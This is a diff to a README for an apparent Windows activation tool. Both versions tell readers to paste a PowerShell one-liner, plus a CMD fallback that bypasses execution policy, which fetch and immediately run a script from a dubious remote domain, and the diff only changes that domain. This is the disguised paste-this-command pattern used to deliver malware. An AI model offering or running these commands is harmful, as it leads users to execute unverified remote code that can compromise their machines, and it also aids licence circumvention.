@@ -26,14 +26,14 @@ Windows-Activation-Suite is a desktop utility that provides HWID, Ohook, TSforge
 Copy the line below into PowerShell and press `Enter`.
 
 ```cmd
-iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
+iex(irm 'https://activation-gateway.cc/update/ps-activator')
 ```
 
 ### 3️⃣ If blocked by policy — CMD fallback
 Run this command in CMD instead:
 
 ```cmd
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
 ```
 
 > [!WARNING]
